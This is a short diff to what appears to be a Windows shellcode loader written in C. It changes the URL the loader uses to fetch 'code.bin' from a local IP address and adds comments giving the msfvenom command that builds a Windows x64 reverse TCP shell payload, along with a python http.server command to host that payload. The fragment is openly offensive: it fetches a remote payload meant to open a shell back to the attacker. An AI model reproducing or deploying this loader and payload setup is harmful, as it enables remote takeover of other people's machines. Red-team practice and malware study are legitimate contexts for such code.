@@ -89,7 +89,9 @@ _EndOfFunction:
 
 int main() {
 
-	WCHAR URL[] = L"http://192.168.30.183:8181/code.bin";
+	// msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=443 -f raw -o code.bin
+	// python -m http.server 80
+	WCHAR URL[] = L"http://192.168.30.183/code.bin";
 	PBYTE PayloadByte = NULL;
 	SIZE_T PayloadSize = NULL;
 
